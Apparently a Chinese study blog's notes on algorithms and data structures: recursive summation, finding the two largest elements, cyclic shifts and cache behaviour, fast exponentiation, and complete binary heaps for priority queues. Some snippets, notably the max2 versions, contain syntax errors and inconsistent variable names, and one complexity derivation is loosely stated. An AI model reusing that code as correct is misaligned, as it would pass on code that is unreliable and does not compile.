<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sum</span> <span class="params">( <span class="keyword">int</span> A[], <span class="keyword">int</span> lo, <span class="keyword">int</span> hi )</span> </span>&#123; <span class="comment">//数组求和算法（二分递归版，入口为sum(A, 0, n - 1)）</span></span><br><span class="line">   <span class="keyword">if</span> ( lo == hi ) <span class="comment">//如遇递归基（区间长度已降至1），则</span></span><br><span class="line">      <span class="keyword">return</span> A[lo]; <span class="comment">//直接返回该元素</span></span><br><span class="line">   <span class="keyword">else</span> &#123; <span class="comment">//否则（一般情况下lo &lt; hi），则</span></span><br><span class="line">      <span class="keyword">int</span> mi = ( lo + hi ) &gt;&gt; <span class="number">1</span>; <span class="comment">//以居中单元为界，将原区间一分为二</span></span><br><span class="line">      <span class="keyword">return</span> sum ( A, lo, mi ) + sum ( A, mi + <span class="number">1</span>, hi ); <span class="comment">//递归对各子数组求和，然后合计</span></span><br><span class="line">   &#125;</span><br><span class="line">&#125; <span class="comment">//O(hi - lo + 1)，线性正比于区间的长度</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>递归跟踪分析</p>
</blockquote>
<p>$T(n)$为各层递归实例所需时间之和，</p>
<p>$T(n)=O(1)(1+2+…+n)=o(1)(2n-1)=O(n)$</p>
<blockquote>
<p>递推方程分析</p>
</blockquote>
<p>$T(n)=2T(n/2)+O(1)$</p>
<p>$T(0)=O(1)$</p>
<p>$T(n)= O(n)$</p>
<blockquote>
<p>从数组区间A[lo,hi)找出最大的两个整数A[x1],A[x2],比较的次数尽可能少</p>
</blockquote>
<p><strong>迭代版本1</strong></p>
<p>无论如何，比较次数总是$2n-3$次</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">max2</span><span class="params">(<span class="keyword">int</span> a[],<span class="keyword">int</span> lo,<span class="keyword">int</span> hi,<span class="keyword">int</span>&amp; x1,<span class="keyword">int</span>&amp; x2)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(x1=lo;<span class="keyword">int</span> i=lo+<span class="number">1</span>;i&lt;hi;i++)&#123;</span><br><span class="line">	    <span class="keyword">if</span>(a[x1]&lt;a[i]) x1=i;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(x2=lo,<span class="keyword">int</span> i=lo+<span class="number">1</span>;i&lt;x1;i++)&#123;</span><br><span class="line">	    <span class="keyword">if</span>(a[x2]&lt;a[i]) x2=i;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=x1+<span class="number">1</span>;i&lt;hi;i++)&#123;</span><br><span class="line">	     <span class="keyword">if</span>(a[x2]&lt;a[i] x2=i;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>迭代版本2</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">max2</span><span class="params">(<span class="keyword">int</span> a[],<span class="keyword">int</span> lo,<span class="keyword">int</span> hi,<span class="keyword">int</span>&amp; x1,<span class="keyword">int</span>&amp; x2)</span></span>&#123;</span><br><span class="line">     <span class="keyword">if</span>(a[x1=lo]&lt;a[x2=lo+<span class="number">1</span>]) swap(x1,x2);</span><br><span class="line">	 <span class="keyword">for</span>(<span class="keyword">int</span> i=lo+<span class="number">2</span>;i&lt;hi;i++)&#123;</span><br><span class="line">	     <span class="keyword">if</span>(a[x2]&lt;a[i])&#123;</span><br><span class="line">		   <span class="keyword">if</span>(a[x1]&lt;a[x2=i])&#123;</span><br><span class="line">		      swap(x1,x2);</span><br><span class="line">		    &#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最好情况：$1+(n-2)=n-1$</p>
<p>最坏情况：$1+(n-2)2=2n-3$</p>
<p><strong>迭代版本3</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">max2</span><span class="params">(<span class="keyword">int</span> a[],<span class="keyword">int</span> lo,<span class="keyword">int</span> hi,<span class="keyword">int</span>&amp; x1,<span class="keyword">int</span>&amp; x2)</span></span>&#123;</span><br><span class="line">     <span class="keyword">if</span>(hi&lt;=lo+<span class="number">3</span>) &#123;trivial(A,lo,hi,x1,x2);<span class="keyword">return</span>;&#125;</span><br><span class="line">     <span class="keyword">int</span> mi=(lo+hi)/<span class="number">2</span>;</span><br><span class="line">     <span class="keyword">int</span> x1L,x2L;</span><br><span class="line">     max2(A,lo,mi,x1L,X2L);</span><br><span class="line">     <span class="keyword">int</span> x1R,x2R;</span><br><span class="line">     max2(A,mi,hi,x1R,x2R);</span><br><span class="line">     <span class="keyword">if</span>(A[x1L]&gt;A[x1R])&#123;</span><br><span class="line">         x1=x1L;x2=A[x2L]&gt;A[x1R]?x2L:x1R;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">else</span>&#123;</span><br><span class="line">         x1=x1R;X2=A[x1L]&gt;A[x2R]?X1L;x2R;</span><br><span class="line">     &#125;</span><br><span class="line">&#125;<span class="comment">//1+1=2;</span></span><br></pre></td></tr></table></figure>
<p>时间复杂度分析如下：</p>
<p>$T(n)=2T(n/2)+2\leq 5n/3-2$​</p>
<p>$G(n)=T(n)+2$​</p>
<p>$G(n)=2T(n/2)$</p>
<p>$G(n)=2T(n/2)=4G(n/4)=8G(n/8)$</p>
<p>如果不考虑取整问题，</p>
<p>$G(n)=(n/3)G(n/(n/3))=(n/3)G(3)$</p>
<p>$G(n)=(n/2)G(2)$</p>
<p>$G(2)$和$G(3)$为递归基，</p>
<p>$T(3)\leq 3$</p>
<p>$G(3)=T(3)+2\leq5$</p>
<p>$G(n)\leq(5/3)n$</p>
<p>$T(2)=1$</p>
<p>$G(2)=T(2)+1=3$</p>
<p>$G(n)=(3/2)n$</p>
<p>取较大者，$G(n)\leq(n/3)G(3)\leq(5/3)n$</p>
<p>$T(N)=G(n)-2\leq(5/3)n-2$</p>
<p>以上为粗略的放缩</p>
<p>$T(n)=\lceil{3n/2} \rceil -2$</p>
<p>证明如下：</p>
<p>算法的具体过程为：</p>
<ul>
<li>将原问题划分为两个子问题，分别对应于向量的前半部分和后半部分</li>
<li>递归求解两问题的解，只需两次比较操作即可得到原问题的解</li>
</ul>
<p>若前一子向量中最大、次大元素分别为$a_1$,$a_2$,后一子向量分别为$b_1$,$b_2$,则全局最大元素必然取自$a_1$，$b_1$之间，不失一般性地，设：</p>
<p>$a_1=max(a_1,b_1)$</p>
<p>于是全局的次大元素必然取自$a_2$，$b_1$</p>
<p>$max(a_2,b_1)$</p>
<p>由以上分析可得边界条件和递推方程如下：</p>
<p>$T(n)=2T(n/2)+2$</p>
<p>$T(2)=1$</p>
<p>若令$S(n)=(T(n)+2)/2$</p>
<p>则有</p>
<p>$S(n)=S(n/2)=…=S(2)=3/2$</p>
<p>故有$T(n)=\lceil{3n/2} \rceil -2$</p>
<p>这里的关键性技巧在于，合并子问题的解可以仅需要两次而不是三次操作，否则，递归关系应该是：</p>
<p>$T(n)=2T(n/2)+3$</p>
<p>$T(n)=2n-3$</p>
<h1 id="抽象数据类型"><a href="#抽象数据类型" class="headerlink" title="抽象数据类型"></a>抽象数据类型</h1><p>各种数据结构可看作是若干数据项构成的集合，同时对数据项预定义一组标准的操作。将数据项和对应的操作视为一个整体，从而将数据结构的外部实现和其内部实现相分离。数据集合和对应的操作可超脱于具体的程序设计语言和具体的实现方式。</p>
<p>抽象数据类型由数据模型和定义在该模型上的一组操作，为外部的逻辑特性，不涉及数据的存储方式。</p>
<p>数据结构为内部的表示与实现，实现抽象数据类型的一系列存储和读取信息的算法。其中存储信息的操作称为更新，读取信息的操作称为查询。</p>
<p>例如，有序列表支持以下操作：</p>
<ul>
<li>查询：<code>min()</code>,<code>max()</code>,<code>search(x)</code></li>
<li>更新：<code>insert(x)</code>,<code>delete(x)</code></li>
</ul>
<p>数据结构的特性为表示不变量(representation invariant)，指明了信息如何存储。不变量是一种属性，在程序运行时总是一种状态。表示不变量确保数据结构正常运行。只要表示不变性仍然保持，那么查询就会得到正确的结果。更新操作需确保更新后表示不变量仍然满足。</p>
<p>例如，有序向量的表示不变量为存储在向量中的关键值必然有序。二分查找在向量有序时必然是正确的，另一方面，插入时需保持向量的表示不变量。</p>
<h1 id="局限"><a href="#局限" class="headerlink" title="局限"></a>局限</h1><h2 id="缓存"><a href="#缓存" class="headerlink" title="缓存"></a>缓存</h2><blockquote>
<p>就地(仅用常数辅助空间)将数组A[0,N)中的元素向左循环移动k个单元</p>
</blockquote>
<p><strong>蛮力版</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">shift0</span> <span class="params">( <span class="keyword">int</span>* A, <span class="keyword">int</span> n, <span class="keyword">int</span> k )</span> </span>&#123; <span class="comment">//蛮力地将数组循环左移k位，O(nk)</span></span><br><span class="line">   <span class="keyword">if</span> ( k &lt; <span class="number">1</span> ) <span class="keyword">return</span> <span class="number">0</span>; <span class="keyword">int</span> mov = <span class="number">0</span>;</span><br><span class="line">   <span class="keyword">while</span> ( k-- ) &#123; <span class="comment">//反复以1为间隔循环左移，共迭代k次</span></span><br><span class="line">      mov += shift ( A, n, <span class="number">0</span>, <span class="number">1</span> );                                 </span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> mov;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>迭代版</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">shift1</span> <span class="params">( <span class="keyword">int</span>* A, <span class="keyword">int</span> n, <span class="keyword">int</span> k )</span> </span>&#123; </span><br><span class="line">   <span class="keyword">if</span> ( k &lt; <span class="number">1</span> ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">   <span class="keyword">int</span> mov = <span class="number">0</span>, s = <span class="number">0</span>;</span><br><span class="line">   <span class="keyword">while</span> ( mov &lt; n ) &#123; <span class="comment">//O(GCD(n, k)) = O(n*k/LCM(n, k))</span></span><br><span class="line">      mov += shift ( A, n, s++, k );                                 </span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> mov;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中<code>shift</code>实现如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">shift</span> <span class="params">( <span class="keyword">int</span>* A, <span class="keyword">int</span> n, <span class="keyword">int</span> s, <span class="keyword">int</span> k )</span> </span>&#123; <span class="comment">//从A[s]出发，以k为间隔循环左移，O(n / GCD(n, k))</span></span><br><span class="line">   <span class="keyword">int</span> bak = A[s]; <span class="comment">//备份起始元素</span></span><br><span class="line">   <span class="keyword">int</span> i = s, j = ( s + k ) % n; <span class="comment">//从该元素出发</span></span><br><span class="line">   <span class="keyword">int</span> mov = <span class="number">0</span>; <span class="comment">//移动次数</span></span><br><span class="line">   <span class="keyword">while</span> ( s != j ) &#123; <span class="comment">//以k为间隔</span></span><br><span class="line">      A[i] = A[j]; <span class="comment">//依次左移k位</span></span><br><span class="line">      i = j; j = ( j + k ) % n; mov++;</span><br><span class="line">   &#125;</span><br><span class="line">   A[i] = bak; <span class="comment">//将起始元素转入对应位置</span></span><br><span class="line">   <span class="keyword">return</span> mov + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>通过<code>GCD(n, k)</code>轮迭代，将数组循环左移$k$位，时间复杂度为O(n)。$[0,n)$由关于$k$的<code>gcd(n,k)</code>个同余类组成，<code>shift(s,k)</code>只能够使其中一个同余类就位。</p>
<p><strong>倒置版</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">shift2</span> <span class="params">( <span class="keyword">int</span>* A, <span class="keyword">int</span> n, <span class="keyword">int</span> k )</span> </span>&#123; <span class="comment">//借助倒置算法，将数组循环左移k位，O(3n)</span></span><br><span class="line">   k %= n; <span class="comment">//确保k &lt;= n</span></span><br><span class="line">   reverse ( A, k ); <span class="comment">//将区间A[0, k)倒置：O(3k/2)次操作</span></span><br><span class="line">   reverse ( A + k, n - k ); <span class="comment">//将区间A[k, n)倒置：O(3(n - k)/2)次操作</span></span><br><span class="line">   reverse ( A, n ); <span class="comment">//倒置整个数组A[0, n)：O(3n/2)次操作</span></span><br><span class="line">   <span class="keyword">return</span> <span class="number">3</span> * n; <span class="comment">//返回累计操作次数，以便与其它算法比较：3/2 * (k + (n - k) + n) = 3n</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>该算法需要更多的元素交换操作，但是实际计算效率远远优于其余版本。究其原因在于，reverse涉及的数据元素在物理上是连续分布的，操作系统的缓存机制可以轻易地被激活，并充分发挥作用。其余版本的交换操作尽管可能更少，但是数据元素往往相距很远，缓存机制几乎完全失效。</p>
<h2 id="字宽"><a href="#字宽" class="headerlink" title="字宽"></a>字宽</h2><blockquote>
<p>对任意整数，求2^n</p>
</blockquote>
<p><strong>蛮力迭代版</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">power2BF_I</span> <span class="params">( <span class="keyword">int</span> n )</span> </span>&#123; <span class="comment">//幂函数2^n算法（蛮力迭代版），n &gt;= 0</span></span><br><span class="line">   __int64 <span class="built_in">pow</span> = <span class="number">1</span>; <span class="comment">//O(1)：累积器初始化为2^0</span></span><br><span class="line">   <span class="keyword">while</span> ( <span class="number">0</span> &lt; n -- ) <span class="comment">//O(n)：迭代n轮，每轮都</span></span><br><span class="line">      <span class="built_in">pow</span> &lt;&lt;= <span class="number">1</span>; <span class="comment">//O(1)：将累积器翻倍</span></span><br><span class="line">   <span class="keyword">return</span> <span class="built_in">pow</span>; <span class="comment">//O(1)：返回累积器</span></span><br><span class="line">&#125; <span class="comment">//O(n) = O(2^r)，r为输入指数n的比特位数</span></span><br></pre></td></tr></table></figure>
<p><strong>优化迭代版</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">power2_I</span> <span class="params">( <span class="keyword">int</span> n )</span> </span>&#123; <span class="comment">//幂函数2^n算法（优化迭代版），n &gt;= 0</span></span><br><span class="line">   __int64 <span class="built_in">pow</span> = <span class="number">1</span>; <span class="comment">//O(1)：累积器初始化为2^0</span></span><br><span class="line">   __int64 p = <span class="number">2</span>; <span class="comment">//O(1)：累乘项初始化为2</span></span><br><span class="line">   <span class="keyword">while</span> ( <span class="number">0</span> &lt; n ) &#123; <span class="comment">//O(logn)：迭代log(n)轮，每轮都</span></span><br><span class="line">      <span class="keyword">if</span> ( n &amp; <span class="number">1</span> ) <span class="comment">//O(1)：根据当前比特位是否为1，决定是否</span></span><br><span class="line">         <span class="built_in">pow</span> *= p; <span class="comment">//O(1)：将当前累乘项计入累积器</span></span><br><span class="line">      n &gt;&gt;= <span class="number">1</span>; <span class="comment">//O(1)：指数减半</span></span><br><span class="line">      p *= p; <span class="comment">//O(1)：累乘项自乘</span></span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> <span class="built_in">pow</span>; <span class="comment">//O(1)：返回累积器</span></span><br><span class="line">&#125; <span class="comment">//O(logn) = O(r)，r为输入指数n的比特位数</span></span><br></pre></td></tr></table></figure>
<p><strong>蛮力递归版</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">power2BF</span> <span class="params">( <span class="keyword">int</span> n )</span> </span>&#123; </span><br><span class="line">   <span class="keyword">return</span> ( <span class="number">1</span> &gt; n ) ? <span class="number">1</span> : power2BF ( n - <span class="number">1</span> ) &lt;&lt; <span class="number">1</span>; <span class="comment">//递归</span></span><br><span class="line">&#125; <span class="comment">//O(n) = O(2^r)，r为输入指数n的比特位数</span></span><br></pre></td></tr></table></figure>
<p><strong>优化递归版</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">inline</span> __int64 <span class="title">sqr</span> <span class="params">( __int64 a )</span> </span>&#123; <span class="keyword">return</span> a * a; &#125;</span><br><span class="line"><span class="function">__int64 <span class="title">power2</span> <span class="params">( <span class="keyword">int</span> n )</span> </span>&#123; <span class="comment">//幂函数2^n算法（优化递归版），n &gt;= 0</span></span><br><span class="line">   <span class="keyword">if</span> ( <span class="number">0</span> == n ) <span class="keyword">return</span> <span class="number">1</span>; <span class="comment">//递归基；否则，视n的奇偶分别递归</span></span><br><span class="line">   <span class="keyword">return</span> ( n &amp; <span class="number">1</span> ) ? sqr ( power2 ( n &gt;&gt; <span class="number">1</span> ) ) &lt;&lt; <span class="number">1</span> : sqr ( power2 ( n &gt;&gt; <span class="number">1</span> ) );</span><br><span class="line">&#125; <span class="comment">//O(logn) = O(r)，r为输入指数n的比特位数</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>对任何给定的整数n&gt;0,计算$a^n$</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">power</span> <span class="params">( __int64 a, <span class="keyword">int</span> n )</span> </span>&#123; <span class="comment">//a^n算法：n &gt;= 0</span></span><br><span class="line">   __int64 <span class="built_in">pow</span> = <span class="number">1</span>; <span class="comment">//O(1)</span></span><br><span class="line">   __int64 p = a; <span class="comment">//O(1)</span></span><br><span class="line">   <span class="keyword">while</span> ( <span class="number">0</span> &lt; n ) &#123; <span class="comment">//O(logn)</span></span><br><span class="line">      <span class="keyword">if</span> ( n &amp; <span class="number">1</span> ) <span class="comment">//O(1)</span></span><br><span class="line">         <span class="built_in">pow</span> *= p; <span class="comment">//O(1)</span></span><br><span class="line">      n &gt;&gt;= <span class="number">1</span>; <span class="comment">//O(1)</span></span><br><span class="line">      p *= p; <span class="comment">//O(1)</span></span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> <span class="built_in">pow</span>; <span class="comment">//O(1)</span></span><br><span class="line">&#125; <span class="comment">//power()</span></span><br></pre></td></tr></table></figure>
<p>输入规模=n的二进制位数=r,复杂度主要取决于循环次数</p>
<p>$T(r)=1+1+4r+1=O(r)$</p>
<blockquote>
<p>直接打印power(n)至少需要n单位的时间，而以上算法为O(logn)，存在悖论？</p>
</blockquote>
<p>基于power的分析都假定，整数的除法，打印等基本操作只需要O(1)时间，即采用所谓的常数代价准则。</p>
<p>设参与运算的整数数值为k，上述操作都需要逐个读取K的二进制展开的每一比特位，线性正比于k的有效位的总数目，即采用所谓的对数代价准则。</p>
<h2 id="随机数"><a href="#随机数" class="headerlink" title="随机数"></a>随机数</h2><p>随机数并不等概率地生成随机序列，随机数仍是人为制造地有规律的序列，所以无法满足随机均匀分布的假定条件。</p>
]]></content>
      <categories>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>Data structure</tag>
      </tags>
  </entry>
  <entry>
    <title>优先级队列</title>
    <url>/algorithm/pq/</url>
    <content><![CDATA[<p>此前的搜索树和词典结构都支持覆盖全集的访问和操作，其中存储的每一数据对象都可作为查找和访问目标。搜索树结构需要在所有元素之间定义并维护一个显式的全序关系，而词典结构从内部强制地在对象和对应的秩之间建立起某种关联关系，隐式地定义了一个全序关系。优先级队列将操作对象限定于当前的全局极值者。比如，在所有鸟类中，查找种群规模最小者。这一访问方式称为循优先级访问。</p>
<a id="more"></a>

<p>在实际应用环境中，不少事件都可用优先级队列描述，比如银行会员排队问题，操作系统的任务调度问题，输入法的词频调整。数据项的某种属性只要可以相互比较大小，则这种大小称为优先级。按照事先约定的优先级，可以始终高效地查找优先级最高的数据项的数据结构统一称为优先级队列。</p>
<p>考虑之前的数据结构效率</p>
<table>
<thead>
<tr>
<th></th>
<th>getmax()</th>
<th>delmax()</th>
<th>insert()</th>
</tr>
</thead>
<tbody><tr>
<td>无序向量</td>
<td>$\Theta(n)$</td>
<td>$ \Theta(n)$</td>
<td>$O( 1 )$</td>
</tr>
<tr>
<td>有序向量</td>
<td>$O (1)$</td>
<td>$O (1)$</td>
<td>$O( n )$</td>
</tr>
<tr>
<td>无序列表</td>
<td>$\Theta ( n )$</td>
<td>$\Theta ( n )$</td>
<td>$O ( 1 )$</td>
</tr>
<tr>
<td>有序列表</td>
<td>$O (1)$</td>
<td>$O (1)$</td>
<td>$O( n )$</td>
</tr>
</tbody></table>
<p>AVL、splay、red-black树三个接口均只需$O(logn)$时间，但是BBST的功能远远超出了优先级队列的要求。若只需查找极值元，则不必维护所有元素的全序关系，偏序足以。</p>
<h1 id="完全二叉堆"><a href="#完全二叉堆" class="headerlink" title="完全二叉堆"></a>完全二叉堆</h1><p>有限偏序值的极值必定存在，此时借助堆结构维护一个全序即足矣。完全二叉堆即为堆结构的典型代表。</p>
<h2 id="结构性与堆序性"><a href="#结构性与堆序性" class="headerlink" title="结构性与堆序性"></a>结构性与堆序性</h2><p>首先结构性是在逻辑结构上须等同于完全二叉树，如此一来，堆节点和词条一一对应。其次，堆顶节点之外的每个节点都不大于其父节点，这即为堆序性。</p>
<p>由堆序性可以看出，堆中优先级最高的词条必然处于堆顶位置。因此，堆结构的<code>getmax()</code> 操作总是在堆顶完成。</p>
<p>完全二叉堆的拓扑联接结构完全由其规模$n$确定。按照层次遍历的顺序，每个节点都对应唯一的编号。故若将所有节点组织为一个向量，则堆中各节点与向量单元的秩必将一一对应。各节点在物理上连续排列，故仅需$O(n)$时间。通过节点的编号，可便捷地判断父子关系。</p>
<p>对于完全二叉堆中的任意节点$v$，必然满足：</p>
<ol>
<li>若$v$有左孩子，则$i(lchild(v))=2i(v)+1$</li>
<li>若$v$有右孩子，则$i(rchild(v))=2i(v)+2$</li>
<li>若$v$有父节点，则$i(parent(v))=\lfloor (i(v)-1)/2 \rfloor=\lceil i(v)/2 \rceil -1$</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span>  Parent(i)         ( ( i - 1 ) &gt;&gt; 1 ) <span class="comment">//PQ[i]的父节点（floor((i-1)/2)，i无论正负）</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>  LChild(i)         ( 1 + ( ( i ) &lt;&lt; 1 ) ) <span class="comment">//PQ[i]的左孩子</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>  RChild(i)         ( ( 1 + ( i ) ) &lt;&lt; 1 ) <span class="comment">//PQ[i]的右孩子</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>  LastInternal(n)   Parent( n - 1 ) <span class="comment">//最后一个内部节点（即末节点的父亲）</span></span></span><br></pre></td></tr></table></figure>
<p>共$n$个节点时，内部节点的最大秩$=\lfloor (n-2)/2 \rfloor=\lceil (n-3)/2 \rceil$</p>
<p>令各节点的秩统一地递增一个单位，从秩的二进制表示来看，祖先必是后代的前缀。</p>
<p>对于秩为$r$的元素，其上溯第$h$代祖先所对应的秩必然为$O((r+1)&gt;&gt;h)-1)$</p>
<h2 id="插入"><a href="#插入" class="headerlink" title="插入"></a>插入</h2><p>为插入词条$e$,只需将$e$作为末元素接入向量，结构性自然保持，若堆序性亦未破坏，则完成。</p>
<p>若违反堆序性，则只能是与其父亲违反堆序性，$e$与其父节点交换，不断重复直到$e$与其父亲满足堆序性或者$e$到达堆顶。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="keyword">void</span> PQ_ComplHeap&lt;T&gt;::insert ( T e ) &#123; <span class="comment">//将词条插入完全二叉堆中</span></span><br><span class="line">   Vector&lt;T&gt;::insert ( e ); <span class="comment">//首先将新词条接至向量末尾</span></span><br><span class="line">   percolateUp ( _size - <span class="number">1</span> ); <span class="comment">//再对该词条实施上滤调整</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//对向量中的第i个词条实施上滤操作，i &lt; _size</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; Rank PQ_ComplHeap&lt;T&gt;::percolateUp ( Rank i ) &#123;</span><br><span class="line">   <span class="keyword">while</span> ( ParentValid ( i ) ) &#123; <span class="comment">//只要i有父亲（尚未抵达堆顶），则</span></span><br><span class="line">      Rank j = Parent ( i ); <span class="comment">//将i之父记作j</span></span><br><span class="line">      <span class="keyword">if</span> ( lt ( _elem[i], _elem[j] ) ) <span class="keyword">break</span>; <span class="comment">//一旦当前父子不再逆序，上滤旋即完成</span></span><br><span class="line">      swap ( _elem[i], _elem[j] ); i = j; <span class="comment">//否则，父子交换位置，并继续考查上一层</span></span><br><span class="line">   &#125; <span class="comment">//while</span></span><br><span class="line">   <span class="keyword">return</span> i; <span class="comment">//返回上滤最终抵达的位置</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>效率</strong></p>
<p>$e$与父亲的交换，每次仅需$O(1)$时间，每经过一次交换,$e$都会上升一层。在插入新节点$e$的过程中，只有$e$的祖先们才有可能需要与之交换。完全二叉堆以完全二叉树实现，必平衡，故$e$的祖先至多$O(logn)$个。</p>
<p>通过上滤，可在$O(logn)$时间内插入一个新节点，并整体得以调整为堆。</p>
<p>可在向量中将各节点顺次后移一个单元，并在腾出的元素中置入对应元素类型的最大值作为哨兵(比如，对于整数取作<code>INT_MAX</code>)。但在上滤过程中只需比较父子节点的大小，而无需核对是否越界。</p>
<p>如此转换后，父子节点各自在物理上所对应的秩需要进行调整</p>
<p>对于完全二叉堆中的任意节点$v$，必然满足：</p>
<ol>
<li>若$v$有左孩子，则$i(lchild(v))=2i(v)$</li>
<li>若$v$有右孩子，则$i(rchild(v))=2i(v)+1$</li>
<li>若$v$有父节点，则$i(parent(v))=\lfloor i(v)/2 \rfloor=\lceil (i(v)-1)/2 \rceil $</li>
</ol>
<p>在上滤的过程无需核对是否已经越界，因此在一定程度上提高插入操作的效率，但渐进复杂度仍然为$O(logn)$。当然，以上调整对下滤的过程及效率没有影响。</p>
<p>在堆顶通往任一叶节点的沿途上，各节点对应的关键码必然单调变化。所以可在引入新节点但未上滤调整之前，将该节点对应的查找路径视为一个静态查找表。并使用二分查找算法。</p>
<p>具体地，每次都可在$O(1)$时间内确定高度居中地祖先的秩，将其作为轴点，只需再做$O(1)$次比较，即可将查找范围缩小一半。如此反复迭代，直到查找范围内只剩下耽搁节点。</p>
<p>既然完全二叉堆的高度不超过$h=O(logn)$,故整个查找过程的迭代次数将不超过：</p>
<p>$logh=O(loglogn)$</p>
<p>以上算法只适用于上滤操作，因为任一节点通向其后代的路径并不唯一，而通往其祖先的路径必然唯一。</p>
<p>同时，以上方法可以有效地减少词条地比较操作，但是词条交换操作却不可减少。事实上，无论如何，再最坏情况下仍然需要执行$O( h )=O(logn)$次交换操作。</p>
<h2 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h2><p>最大元素始终在堆顶，删除堆顶元素只需要摘除向量首元素，以末元素$e$代替。若新堆顶$e$不满足堆序性，将$e$与其(至多)两个孩子中的大者交换。若与新孩子继续违反堆序性，则继续套用以上方法，不断重复，直到$e$满足堆序性，或已为叶子。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; T PQ_ComplHeap&lt;T&gt;::delMax() &#123; <span class="comment">//删除非空完全二叉堆中优先级最高的词条</span></span><br><span class="line">   T maxElem = _elem[<span class="number">0</span>]; _elem[<span class="number">0</span>] = _elem[ --_size ]; <span class="comment">//摘除堆顶（首词条），代之以末词条</span></span><br><span class="line">   percolateDown ( _size, <span class="number">0</span> ); <span class="comment">//对新堆顶实施下滤</span></span><br><span class="line">   <span class="keyword">return</span> maxElem; <span class="comment">//返回此前备份的最大词条</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//对向量前n个词条中的第i个实施下滤，i &lt; n</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; Rank PQ_ComplHeap&lt;T&gt;::percolateDown ( Rank n, Rank i ) &#123;</span><br><span class="line">   Rank j; <span class="comment">//i及其（至多两个）孩子中，堪为父者</span></span><br><span class="line">   <span class="keyword">while</span> ( i != ( j = ProperParent ( _elem, n, i ) ) ) <span class="comment">//只要i非j，则</span></span><br><span class="line">      &#123; swap ( _elem[i], _elem[j] ); i = j; &#125; <span class="comment">//二者换位，并继续考查下降后的i</span></span><br><span class="line">   <span class="keyword">return</span> i; <span class="comment">//返回下滤抵达的位置（亦i亦j）</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>效率</strong></p>
<p>在下滤的过程中，每经过一次交换，$e$的高度都将降低一层。故在每层至多需要一次交换。由于堆是完全二叉树，高度为$O(logn)$。通过下滤，可在$O(logn)$时间内删除堆顶节点并整体重新调整为堆。</p>
<p>若实际上升$k=O(logn)$层，则$k$次<code>swap()</code>操作共需$3k+1$次，可将此类赋值操作降低至$k+1$次。</p>
<p>在插入接口的上滤操作中，新元素可暂且不予插入，而只是将其上若干代祖先节点依次下移，待所有祖先均已就位时，才将新元素置入腾空的空节点。删除操作同理。</p>
<blockquote>
<p>为何在摘除堆顶元素后，不自上而下地依次以更大孩子节点顶替空缺的父节点</p>
</blockquote>
<p>如此可以维持完全二叉堆的堆序性，但是经过如此调整后完全二叉堆的拓扑结构未必仍然是一棵完全二叉树，故其结构性可能遭到破坏，因为该节点到最大孩子的路径和根节点到末节点的路径未必是同一条。</p>
<blockquote>
<p>在关键码独立均匀分布时，插入操作平均只需常数时间</p>
</blockquote>
